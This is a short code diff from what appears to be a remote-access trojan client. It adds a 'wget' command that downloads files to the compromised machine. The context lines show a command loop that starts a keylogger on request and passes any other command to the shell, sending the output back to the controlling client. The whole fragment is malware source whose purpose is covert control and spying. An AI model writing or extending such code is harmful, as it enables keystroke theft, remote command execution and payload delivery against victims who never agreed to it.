@@ -1,5 +1,6 @@
 from client import Client
 from transfer import FileTransfer
+from download import Download
 import os
 import sys
 import subprocess
@@ -121,6 +122,11 @@ def main():
 			from keylogger import Keylogger
 			keylogger = Keylogger(client)
 			keylogger.record()
+		elif cmd == "wget":
+			if len(args) == 1:
+				Download.get(args[0])
+			elif len(args) == 2:
+				Download.get(args[0], args[1])
 		else:
 			output = subprocess.getoutput(cmd + " " + ' '.join(args))
 			client.send(output)
